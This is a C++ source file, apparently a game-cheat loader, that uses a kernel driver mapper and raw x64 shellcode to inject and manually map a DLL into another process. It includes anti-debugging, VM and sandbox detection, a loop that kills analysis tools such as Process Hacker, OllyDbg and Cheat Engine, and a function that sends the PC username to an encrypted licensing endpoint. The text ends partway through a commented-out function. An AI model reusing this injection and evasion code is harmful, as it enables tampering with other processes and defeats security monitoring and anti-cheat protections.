
#define _CRT_SECURE_NO_WARNINGS
#define CURL_STATICLIB

#pragma warning( disable : 4789 )
#pragma warning (disable: 4995)
#include <Windows.h>
#include <iostream>
#include <assert.h>
#include <TlHelp32.h>
#include <string>
#include <vector>
#include <random>
#include "utils.hpp"
#include "kdmapper.hpp"
#include <ShlObj.h>
#include <ShlObj_core.h>
#include <strsafe.h>
#include <NetCon.h>
#include <Psapi.h>
#include <regex>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <array>
#include <curl.h>

//#include <WinInet.h>

#include "authgg/xor.h"
#include "authgg/lw_http.hpp"
#include "authgg/print.h"
#include "authgg/hwid.h"
#include "authgg/md5wrapper.h"
#include "authgg/crypto.h"
#include "authgg/authgg.h"


#include "..\lazy_importer.hpp"
#include <CkCrypt2.h>
#include <CkBinData.h>
#include <thread>
#include <CkJsonArray.h>
#include <CkJsonObject.h>
#include <sstream>
#include <iphlpapi.h>
#include <atlstr.h>

#include "utils.h"

#include <CkFileAccess.h>
#include <CkByteData.h>

#include "..\CheatMeme.h"
#include "..\AntiDebug.h"
#include "..\anti_opcode.h"
#include <VMProtectSDK.h>


#pragma comment(lib, "wininet")
#pragma comment(lib, "ntdll")
#pragma comment(lib, "Normaliz")
#pragma comment(lib, "Ws2_32")
#pragma comment(lib, "Wldap32")
#pragma comment(lib, "Crypt32")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "version")
#pragma comment(lib, "dnsapi")
#pragma comment(lib, "ChilkatRelDll_x64")
#pragma comment(lib, "dwmapi")

#include "..\api\shellcode.h"

#define patch_shell   wxorstr_(L"\\SoftwareDistribution\\Download\\")

string random_string()
{
    srand((unsigned int)time((time_t)0));
    string str = xorstr_("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
    string newstr;
    int pos;
    while (newstr.size() != 32)
    {
        pos = ((rand() % (str.size() + 1)));
        newstr += str.substr(pos, 1);
    }
    return newstr;
}

wstring random_string_w()
{
    srand((unsigned int)time((time_t)0));
    wstring str = wxorstr_(L"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
    wstring newstr;
    int pos;
    while (newstr.size() != 5)
    {
        pos = ((rand() % (str.size() + 1)));
        newstr += str.substr(pos, 1);
    }
    return newstr;
}

wstring get_parent(const wstring& path)
{
    if (path.empty())
        return path;

    auto idx = path.rfind(L'\\');
    if (idx == path.npos)
        idx = path.rfind(L'/');

    if (idx != path.npos)
        return path.substr(0, idx);
    else
        return path;
}

wstring get_exe_directory()
{
    wchar_t imgName[MAX_PATH] = { 0 };
    DWORD len = ARRAYSIZE(imgName);
    QueryFullProcessImageNameW(GetCurrentProcess(), 0, imgName, &len);
    wstring sz_dir = (wstring(get_parent(imgName)) + wxorstr_(L"\\"));
    return sz_dir;
}

wstring get_files_directory()
{
    WCHAR system_dir[256];
    GetWindowsDirectoryW(system_dir, 256);
    wstring sz_dir = (wstring(system_dir) + wxorstr_(L"\\INF\\"));
    return sz_dir;
}

wstring get_random_file_name_directory(wstring type_file)
{
    wstring sz_file = get_files_directory() + random_string_w() + type_file;
    return sz_file;
}

void run_us_admin(std::wstring sz_exe, bool show)
{
    ShellExecuteW(NULL, wxorstr_(L"runas"), sz_exe.c_str(), NULL, NULL, show);
}

void run_us_admin_and_params(wstring sz_exe, wstring sz_params, bool show)
{
    ShellExecuteW(NULL, wxorstr_(L"runas"), sz_exe.c_str(), sz_params.c_str(), NULL, show);
}

#define Lala(s) LI_FN(OutputDebugStringA)(##s);


extern c_crypto crypto;


/////////////////////////////////

string Aes256DecryptString(string str, string pw)
{
    VMProtectBeginMutation("Aes256DecryptString");

    CkCrypt2 crypt;
    crypt.put_CryptAlgorithm(xorstr_("aes"));
    crypt.put_CipherMode(xorstr_("cbc"));
    crypt.put_KeyLength(256);// vCVweCWEXf();
    crypt.put_Charset(xorstr_("utf-8"));
    crypt.put_EncodingMode(xorstr_("base64"));
    crypt.SetSecretKeyViaPassword(pw.c_str());
    string ret(crypt.decryptStringENC(str.c_str()));
    //EnableDebugPriv(true);
    str.clear();
    RtlSecureZeroMemory(&str, sizeof(str));
    str = string(xorstr_("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"));
    pw.clear();
    RtlSecureZeroMemory(&pw, sizeof(pw));
    pw = string(xorstr_("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"));
   // VMProtectFreeString((void*)&str);
   // VMProtectFreeString((void*)&pw);
    Lala("xxxx???xxx?xxxx??xx??x");
    return ret;
    VMProtectEnd();
}
/////////////////////////////////
string Aes256EncryptString(string str, const char* pw)
{
    CkCrypt2 crypt;
    crypt.put_CryptAlgorithm(xorstr_("aes"));
    crypt.put_CipherMode(xorstr_("cbc"));
    crypt.put_KeyLength(256);
    crypt.put_Charset(xorstr_("utf-8"));
    crypt.put_EncodingMode(xorstr_("base64"));
    crypt.SetSecretKeyViaPassword(pw);
    string ret(crypt.encryptStringENC(str.c_str()));
    return ret;
}
/////////////////////////////////
void Aes256EncryptFile(string encrypt_file_path, string decrypt_file_path)
{
    CkCrypt2 crypt;
    crypt.put_CryptAlgorithm(xorstr_("aes"));
    crypt.put_CipherMode(xorstr_("ecb"));
    crypt.put_KeyLength(256);
    crypt.put_HashAlgorithm(xorstr_("sha256"));
    crypt.SetSecretKeyViaPassword(xorstr_("acknex_mainwin"));
    CkBinData fileData;
    fileData.LoadFile(encrypt_file_path.c_str());
    crypt.EncryptBd(fileData);
    fileData.WriteFile(decrypt_file_path.c_str());

}
void Aes256DecryptFile(string encrypt_file_path, string decrypt_file_path)
{
    CkCrypt2 crypt;
    crypt.put_CryptAlgorithm(xorstr_("aes"));
    crypt.put_CipherMode(xorstr_("ecb"));
    crypt.put_KeyLength(256);
    crypt.put_HashAlgorithm(xorstr_("sha256"));
    crypt.SetSecretKeyViaPassword(xorstr_("acknex_mainwin"));
    CkBinData fileData;
    fileData.LoadFile(encrypt_file_path.c_str());
    crypt.DecryptBd(fileData);
    fileData.WriteFile(decrypt_file_path.c_str());
}

void SendLog(const char* Username, const char* Value)
{
    VMProtectBeginUltra("SendLog");
    CHAR compname[128];
    DWORD bufCharCount = 128;
    GetUserNameA(compname, &bufCharCount);

    c_lw_http	lw_http;
    c_lw_httpd	lw_http_d;
    lw_http_d.add_field(xorstr_("type"), xorstr_("log"));
    lw_http_d.add_field(xorstr_("aid"), crypto.aid.c_str());
    lw_http_d.add_field(xorstr_("apikey"), crypto.apikey.c_str());
    lw_http_d.add_field(xorstr_("secret"), crypto.secret.c_str());
    lw_http_d.add_field(xorstr_("username"), Username);
    lw_http_d.add_field(xorstr_("pcuser"), compname);
    lw_http_d.add_field(xorstr_("action"), Value);

    std::string xstr = xorstr_("q5+P6WrvPdIzNXC8zrOIsG1IsyCiR2QHUmv6kwJb+1I=");//api.auth.gg/v1
    xstr = Aes256DecryptString(xstr, xorstr_("ppv^"));
    string s_reply;
    lw_http.post(xstr, s_reply.c_str(), lw_http_d);
    lw_http_d.clear();
    xstr.clear();
    s_reply.clear();
    RtlSecureZeroMemory(&xstr, sizeof(xstr));
    RtlSecureZeroMemory(&Value, sizeof(Value));
    RtlSecureZeroMemory(&s_reply, sizeof(s_reply));
    VMProtectEnd();
}


static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string curlGetRequestt(string url)
{
    auto curl = curl_easy_init();
    std::string readBuffer;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        url.clear();
        RtlSecureZeroMemory(&url, sizeof(url));
        url = string(xorstr_("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"));
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        curl_global_cleanup();

        curl = NULL;
        return readBuffer;
    }
}

typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
    _In_ HANDLE ThreadHandle,
    _In_ ULONG  ThreadInformationClass,
    _In_ PVOID  ThreadInformation,
    _In_ ULONG  ThreadInformationLength
    );
const ULONG ThreadHideFromDebugger = 0x11;

void HideFromDebugger()
{
    HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
    pfnNtSetInformationThread NtSetInformationThread = (pfnNtSetInformationThread)
        GetProcAddress(hNtDll, "NtSetInformationThread");
    NTSTATUS status = NtSetInformationThread(GetCurrentThread(),
        ThreadHideFromDebugger, NULL, 0);
}


PIMAGE_NT_HEADERS GetImageNtHeaders(PBYTE pImageBase)
{
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    return (PIMAGE_NT_HEADERS)(pImageBase + pImageDosHeader->e_lfanew);
}

PIMAGE_SECTION_HEADER FindRDataSection(PBYTE pImageBase)
{
    static const std::string rdata = ".rdata";
    PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pImageBase);
    PIMAGE_SECTION_HEADER pImageSectionHeader = IMAGE_FIRST_SECTION(pImageNtHeaders);
    int n = 0;
    for (; n < pImageNtHeaders->FileHeader.NumberOfSections; ++n)
    {
        if (rdata == (char*)pImageSectionHeader[n].Name)
        {
            break;
        }
    }
    return &pImageSectionHeader[n];
}
void CheckGlobalFlagsClearInProcess()
{
    PBYTE pImageBase = (PBYTE)GetModuleHandle(NULL);
    PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pImageBase);
    PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pImageBase
        + pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress);
    if (pImageLoadConfigDirectory->GlobalFlagsClear != 0)
    {
        exit(-1);
    }
}

void CheckGlobalFlagsClearInFile()
{
    HANDLE hExecutable = INVALID_HANDLE_VALUE;
    HANDLE hExecutableMapping = NULL;
    PBYTE pMappedImageBase = NULL;
    __try
    {
        PBYTE pImageBase = (PBYTE)GetModuleHandle(NULL);
        PIMAGE_SECTION_HEADER pImageSectionHeader = FindRDataSection(pImageBase);
        TCHAR pszExecutablePath[MAX_PATH];
        DWORD dwPathLength = GetModuleFileName(NULL, pszExecutablePath, MAX_PATH);
        if (0 == dwPathLength) __leave;
        hExecutable = CreateFile(pszExecutablePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (INVALID_HANDLE_VALUE == hExecutable) __leave;
        hExecutableMapping = CreateFileMapping(hExecutable, NULL, PAGE_READONLY, 0, 0, NULL);
        if (NULL == hExecutableMapping) __leave;
        pMappedImageBase = (PBYTE)MapViewOfFile(hExecutableMapping, FILE_MAP_READ, 0, 0,
            pImageSectionHeader->PointerToRawData + pImageSectionHeader->SizeOfRawData);
        if (NULL == pMappedImageBase) __leave;
        PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pMappedImageBase);
        PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pMappedImageBase
            + (pImageSectionHeader->PointerToRawData
                + (pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress - pImageSectionHeader->VirtualAddress)));
        if (pImageLoadConfigDirectory->GlobalFlagsClear != 0)
        {

            exit(-1);
        }
    }
    __finally
    {
        if (NULL != pMappedImageBase)
            UnmapViewOfFile(pMappedImageBase);
        if (NULL != hExecutableMapping)
            CloseHandle(hExecutableMapping);
        if (INVALID_HANDLE_VALUE != hExecutable)
            CloseHandle(hExecutable);
    }
}
std::string currentDateTime() {
    time_t     now = time(0);
    struct tm  tstruct;
    char       buf[80];
    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), xorstr_(" [%m.%d.%Y %X] "), &tstruct);

    return buf;
}

/////////////////////////////////
BYTE remote_load_library[96] =
{
    0x48, 0x83, 0xEC, 0x38, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20,
    0x83, 0x38, 0x00, 0x75, 0x3D, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x40,
    0x08, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x83, 0xC0, 0x18, 0x48, 0x8B, 0xC8, 0xFF, 0x54, 0x24, 0x28, 0x48, 0x8B,
    0x4C, 0x24, 0x20, 0x48, 0x89, 0x41, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC
};

BYTE remote_call_dll_main[92] =
{
    0x48, 0x83, 0xEC, 0x38, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24,
    0x20, 0x83, 0x38, 0x00, 0x75, 0x39, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48,
    0x8B, 0x40, 0x08, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC0, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B,
    0x48, 0x10, 0xFF, 0x54, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC
}; DWORD shell_data_offset = 0x6;
/////////////////////////////////

/////////////////////////////////
typedef struct _load_library_struct
{
    int status;
    uintptr_t fn_load_library_a;
    uintptr_t module_base;
    char module_name[80];
}load_library_struct;

typedef struct _main_struct
{
    int status;
    uintptr_t fn_dll_main;
    HINSTANCE dll_base;
} main_struct;
/////////////////////////////////

/////////////////////////////////
uintptr_t call_remote_load_library(DWORD thread_id, LPCSTR dll_name)
{
    /////////////////////////////////
    HMODULE nt_dll = LoadLibraryW(wxorstr_(L"ntdll.dll"));
    /////////////////////////////////

    /////////////////////////////////
    PVOID alloc_shell_code = driver().alloc_memory_ex(4096, PAGE_EXECUTE_READWRITE);
    DWORD shell_size = sizeof(remote_load_library) + sizeof(load_library_struct);
    PVOID alloc_local = VirtualAlloc(NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    /////////////////////////////////

    /////////////////////////////////
    RtlCopyMemory(alloc_local, &remote_load_library, sizeof(remote_load_library));
    uintptr_t shell_data = (uintptr_t)alloc_shell_code + sizeof(remote_load_library);
    *(uintptr_t*)((uintptr_t)alloc_local + shell_data_offset) = shell_data;
    load_library_struct* ll_data = (load_library_struct*)((uintptr_t)alloc_local + sizeof(remote_load_library));
    ll_data->fn_load_library_a = (uintptr_t)LoadLibraryA;
    strcpy_s(ll_data->module_name, 80, dll_name);
    /////////////////////////////////

    /////////////////////////////////
    driver().write_memory_ex(alloc_shell_code, alloc_local, shell_size);
    HHOOK h_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)alloc_shell_code, nt_dll, thread_id);
    /////////////////////////////////

    /////////////////////////////////
    while (ll_data->status != 2)
    {
        PostThreadMessage(thread_id, WM_NULL, 0, 0);
        driver().read_memory_ex((PVOID)shell_data, (PVOID)ll_data, sizeof(load_library_struct));
        Sleep(10);
    } uintptr_t mod_base = ll_data->module_base;
    /////////////////////////////////

    /////////////////////////////////
    UnhookWindowsHookEx(h_hook);
    driver().free_memory_ex(alloc_shell_code);
    VirtualFree(alloc_local, 0, MEM_RELEASE);
    /////////////////////////////////

    return mod_base;
}
/////////////////////////////////

/////////////////////////////////
void call_dll_main(DWORD thread_id, PVOID dll_base, PIMAGE_NT_HEADERS nt_header, bool hide_dll)
{
    /////////////////////////////////
    HMODULE nt_dll = LoadLibraryW(wxorstr_(L"ntdll.dll"));
    /////////////////////////////////

    /////////////////////////////////
    PVOID alloc_shell_code = driver().alloc_memory_ex(4096, PAGE_EXECUTE_READWRITE);
    DWORD shell_size = sizeof(remote_call_dll_main) + sizeof(main_struct);
    PVOID alloc_local = VirtualAlloc(NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    /////////////////////////////////

    /////////////////////////////////
    RtlCopyMemory(alloc_local, &remote_call_dll_main, sizeof(remote_call_dll_main));
    uintptr_t shell_data = (uintptr_t)alloc_shell_code + sizeof(remote_call_dll_main);
    *(uintptr_t*)((uintptr_t)alloc_local + shell_data_offset) = shell_data;
    main_struct* main_data = (main_struct*)((uintptr_t)alloc_local + sizeof(remote_call_dll_main));
    main_data->dll_base = (HINSTANCE)dll_base;
    main_data->fn_dll_main = ((uintptr_t)dll_base + nt_header->OptionalHeader.AddressOfEntryPoint);
    /////////////////////////////////

    /////////////////////////////////
    driver().write_memory_ex(alloc_shell_code, alloc_local, shell_size);
    HHOOK h_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)alloc_shell_code, nt_dll, thread_id);
    /////////////////////////////////

    /////////////////////////////////
    while (main_data->status != 2)
    {
        PostThreadMessage(thread_id, WM_NULL, 0, 0);
        driver().read_memory_ex((PVOID)shell_data, (PVOID)main_data, sizeof(main_struct));
        Sleep(10);
    }
    /////////////////////////////////

    /////////////////////////////////
    UnhookWindowsHookEx(h_hook);
    driver().free_memory_ex(alloc_shell_code);
    VirtualFree(alloc_local, 0, MEM_RELEASE);
    /////////////////////////////////
}

PVOID rva_va(uintptr_t rva, PIMAGE_NT_HEADERS nt_head, PVOID local_image)
{
    PIMAGE_SECTION_HEADER p_first_sect = IMAGE_FIRST_SECTION(nt_head);
    for (PIMAGE_SECTION_HEADER p_section = p_first_sect; p_section < p_first_sect + nt_head->FileHeader.NumberOfSections; p_section++)
        if (rva >= p_section->VirtualAddress && rva < p_section->VirtualAddress + p_section->Misc.VirtualSize)
            return (PUCHAR)local_image + p_section->PointerToRawData + (rva - p_section->VirtualAddress);

    return NULL;
}

uintptr_t resolve_func_addr(LPCSTR modname, LPCSTR modfunc)
{
    HMODULE h_module = LoadLibraryExA(modname, NULL, DONT_RESOLVE_DLL_REFERENCES);
    uintptr_t func_offset = (uintptr_t)GetProcAddress(h_module, modfunc);
    func_offset -= (uintptr_t)h_module;
    FreeLibrary(h_module);

    return func_offset;
}

BOOL relocate_image(PVOID p_remote_img, PVOID p_local_img, PIMAGE_NT_HEADERS nt_head)
{
    struct reloc_entry
    {
        ULONG to_rva;
        ULONG size;
        struct
        {
            WORD offset : 12;
            WORD type : 4;
        } item[1];
    };

    uintptr_t delta_offset = (uintptr_t)p_remote_img - nt_head->OptionalHeader.ImageBase;
    if (!delta_offset) return true; else if (!(nt_head->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)) return false;
    reloc_entry* reloc_ent = (reloc_entry*)rva_va(nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress, nt_head, p_local_img);
    uintptr_t reloc_end = (uintptr_t)reloc_ent + nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    if (reloc_ent == nullptr)
        return true;

    while ((uintptr_t)reloc_ent < reloc_end && reloc_ent->size)
    {
        DWORD records_count = (reloc_ent->size - 8) >> 1;
        for (DWORD i = 0; i < records_count; i++)
        {
            WORD fix_type = (reloc_ent->item[i].type);
            WORD shift_delta = (reloc_ent->item[i].offset) % 4096;

            if (fix_type == IMAGE_REL_BASED_ABSOLUTE)
                continue;

            if (fix_type == IMAGE_REL_BASED_HIGHLOW || fix_type == IMAGE_REL_BASED_DIR64)
            {
                uintptr_t fix_va = (uintptr_t)rva_va(reloc_ent->to_rva, nt_head, p_local_img);

                if (!fix_va)
                    fix_va = (uintptr_t)p_local_img;

                *(uintptr_t*)(fix_va + shift_delta) += delta_offset;
            }
        }

        reloc_ent = (reloc_entry*)((LPBYTE)reloc_ent + reloc_ent->size);
    } return true;
}

BOOL resolve_import(DWORD thread_id, PVOID p_local_img, PIMAGE_NT_HEADERS nt_head)
{
    PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)rva_va(nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, nt_head, p_local_img);
    if (!nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress || !nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) return true;

    LPSTR module_name = NULL;
    while ((module_name = (LPSTR)rva_va(import_desc->Name, nt_head, p_local_img)))
    {
        uintptr_t base_image;
        base_image = call_remote_load_library(thread_id, module_name);

        if (!base_image)
            return false;

        PIMAGE_THUNK_DATA ih_data = (PIMAGE_THUNK_DATA)rva_va(import_desc->FirstThunk, nt_head, p_local_img);
        while (ih_data->u1.AddressOfData)
        {
            if (ih_data->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                ih_data->u1.Function = base_image + resolve_func_addr(module_name, (LPCSTR)(ih_data->u1.Ordinal & 0xFFFF));
            else
            {
                IMAGE_IMPORT_BY_NAME* ibn = (PIMAGE_IMPORT_BY_NAME)rva_va(ih_data->u1.AddressOfData, nt_head, p_local_img);
                ih_data->u1.Function = base_image + resolve_func_addr(module_name, (LPCSTR)ibn->Name);
            } ih_data++;
        } import_desc++;
    } return true;
}

void write_sections(PVOID p_module_base, PVOID local_image, PIMAGE_NT_HEADERS nt_head)
{
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_head);
    for (WORD sec_cnt = 0; sec_cnt < nt_head->FileHeader.NumberOfSections; sec_cnt++, section++)
    {
        driver().write_memory_ex((PVOID)((uintptr_t)p_module_base + section->VirtualAddress), (PVOID)((uintptr_t)local_image + section->PointerToRawData), section->SizeOfRawData);
    }
}

void erase_discardable_sect(PVOID p_module_base, PIMAGE_NT_HEADERS nt_head)
{
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_head);
    for (WORD sec_cnt = 0; sec_cnt < nt_head->FileHeader.NumberOfSections; sec_cnt++, section++)
    {
        if (section->SizeOfRawData == 0)
            continue;

        if (section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
        {
            PVOID zero_memory = VirtualAlloc(NULL, section->SizeOfRawData, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            driver().write_memory_ex((PVOID)((uintptr_t)p_module_base + section->VirtualAddress), zero_memory, section->SizeOfRawData);
            VirtualFree(zero_memory, 0, MEM_RELEASE);
        }
    }
}
/////////////////////////////////
void Ritopls(uint64_t addr, uint64_t size, DWORD protect)
{
   // VMProtectBeginUltra("Ritopls");
	driver().protect_memory_ex((uint64_t)addr, size, &protect);
   // VMProtectEnd();
}

bool MethodCheckRemoteDebuggerPresent() {
    BOOL HasDebugPort = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &HasDebugPort);
    return HasDebugPort;
}
bool MethodIsDebuggerPresent() {
    return IsDebuggerPresent() != 0;
}
bool IsDbgPresent()
{
    PBOOL isDetected = 0;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), isDetected);
    return isDetected;
}

void DisplayApatheArt()
{
   /* VMProtectBeginUltra("DisplayApatheArt");
    string aph_s =
        string(xorstr_(" ######  ##    ## ########  ######## ########     ###    ##    ## ######## \n")) +
        string(xorstr_("##    ##  ##  ##  ##     ## ##       ##     ##   ## ##   ###   ##    ##    \n")) +
        string(xorstr_("##         ####   ##     ## ##       ##     ##  ##   ##  ####  ##    ##    \n")) +
        string(xorstr_("##          ##    ########  ######   ########  ##     ## ## ## ##    ##    \n")) +
        string(xorstr_("##          ##    ##     ## ##       ##   ##   ######### ##  ####    ##    \n")) +
        string(xorstr_("##    ##    ##    ##     ## ##       ##    ##  ##     ## ##   ###    ##    \n")) +
        string(xorstr_(" ######     ##    ########  ######## ##     ## ##     ## ##    ##    ##    \n")) +
        string(xorstr_("\n"));
    print::set_text(aph_s.c_str(), Yellow);

    VMProtectFreeString((void*)&aph_s);
    aph_s.clear();
    RtlSecureZeroMemory(&aph_s, aph_s.size() * 2);
    VMProtectEnd();*/
}

void kill_by_pid(DWORD pid)
{

    HANDLE handy;
    handy = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, pid);
    TerminateProcess(handy, 0);
}

DWORD pxd = 0;
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    char class_name[100];
    char title[100];
    GetClassNameA(hwnd, class_name, sizeof(class_name));
    GetWindowTextA(hwnd, title, sizeof(title));
    if (strstr(class_name, xorstr_("WindowsForms10.Window")) ||
        strstr(class_name, xorstr_("WindowsForms8")) ||
        strstr(class_name, xorstr_("WindowsForms8.1")) ||
        strstr(class_name, xorstr_("HintWindow")) ||
        strstr(class_name, xorstr_("LCLListBox")) ||
        strstr(class_name, xorstr_("TFormMain.UnicodeClass")) ||
        strstr(class_name, xorstr_("TFormDebugStrings")) ||
        strstr(class_name, xorstr_("ProcessHacker")) ||
        strstr(title, xorstr_("Sigma")) ||
        strstr(class_name, xorstr_("Olly")) ||
        strstr(class_name, xorstr_("TMainForm")) ||
        strstr(class_name, xorstr_("XTPMainFrame")) ||
        strstr(class_name, xorstr_("SunAwtWindow")) ||
        strstr(class_name, xorstr_("WinRun4J.DDEWndClass")) ||
        strstr(class_name, xorstr_(".NET-BroadcastEventWindow")) ||
        strstr(class_name, xorstr_("Navicat")) ||
        strstr(class_name, xorstr_("RegScanner")) ||
        strstr(class_name, xorstr_("fengyue")) ||
        strstr(class_name, xorstr_("pe--diy")) ||
        strstr(class_name, xorstr_("TMainForm")) && strstr(class_name, xorstr_("TApplication")) ||
        strstr(class_name, xorstr_("Afx:00E40000")) ||
        strstr(class_name, xorstr_("SandboxieControlWndClass")) ||
        strstr(class_name, xorstr_("SandboxieControlBorderWindow")) ||
        strstr(class_name, xorstr_("UPP-CLASS-W")) ||
        strstr(class_name, xorstr_("QEventDispatcherWin32_Internal_Widget")) ||
        strstr(class_name, xorstr_("dbgviewClass")) ||
        strstr(class_name, xorstr_("HHDHexEditor")) ||
        strstr(class_name, xorstr_("ad_win#2")) ||
        //   strstr(title, ("x32dbg")) ||
        strstr(title, xorstr_("Prompt")) && strstr(class_name, xorstr_("#32770")))
    {
      //  SendLog(xorstr_("3rd-Party"), class_name);
     //   SendLog(xorstr_("3rd-Party"), title);
        DWORD pdclass = 0; DWORD pdwindow = 0;
        HWND wind = FindWindowA(NULL, title);
        GetWindowThreadProcessId(wind, &pdwindow);

        HWND clas = FindWindowA(class_name, NULL);
        GetWindowThreadProcessId(clas, &pdclass);
        kill_by_pid((int)pdclass); kill_by_pid((int)pdwindow);
    }
    auto xds = FindWindowA(xorstr_("Window"), 0);
   // if (xds)
   //     SendLog(xorstr_("3rd-Party"), xorstr_("Cheat Engine"));
    GetWindowThreadProcessId(xds, &pxd);
    kill_by_pid(pxd);
    return TRUE;
}

void AntiMeme( )
{
    AntiDebug::HideThread(GetCurrentThread());
    VMProtectBeginUltra("AntiMeme");
    while (1) 
    {
        std::this_thread::sleep_for(1ms);
        ::EnumWindows(EnumWindowsProc, 0);

        if (AntiDebug::IsSystemCodeIntegrityEnabled())
            abort();

        if (!VMProtectIsProtected() || !VMProtectIsValidImageCRC())
            abort();

        if (AntiDebug::IsVirtualBox() == TRUE || AntiDebug::IsSandboxie() == TRUE || AntiDebug::IsVM() == TRUE)
            abort();

        
        if (AntiDebug::CheckRemoteDebuggerPresentAPI())
            abort();
        if (AntiDebug::IsDebuggerPresentAPI())
            abort();
        if (AntiDebug::HardwareBreakpoints())
            abort();
        if (AntiDebug::MemoryBreakpoints_PageGuard())
            abort();
    }
    VMProtectEnd();
}

void AntiPause() // By Yuri-BR
{
    DWORD TimeTest1 = 0, TimeTest2 = 0;
    while (true)
    {
        //std::this_thread::sleep_for(1ms);
        TimeTest1 = TimeTest2;
        TimeTest2 = GetTickCount();
        if (TimeTest1 != 0)
        {
            Sleep(3000);
            if ((TimeTest2 - TimeTest1) > 5000)
            {
                ExitProcess(0);
                TerminateProcess(GetCurrentProcess(), 0);
            }
        }
    }
}

//
//bool drop_mapper(wstring path)
//{
//    //VMProtectBeginUltra("drop_mapper");
//    //HANDLE h_file;
//    //BOOLEAN b_status = FALSE;
//    //DWORD byte = 0;
//
//    //h_file = CreateFileW(path.c_str(), GENERIC_ALL, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
//    //if (GetLastError() == ERROR_FILE_EXISTS)
//    //    return true;
//
//    //if (h_file == INVALID_HANDLE_VALUE)
//    //    return false;
//
//    PVOID rawObj = reinterpret_cast<PVOID>(shell_mapper);
//  
//    CkByteData pObj;
//    pObj.append2(rawObj, 266768);
//    CkCrypt2 crypt2;
//    crypt2.put_CryptAlgorithm(xorstr_("aes"));
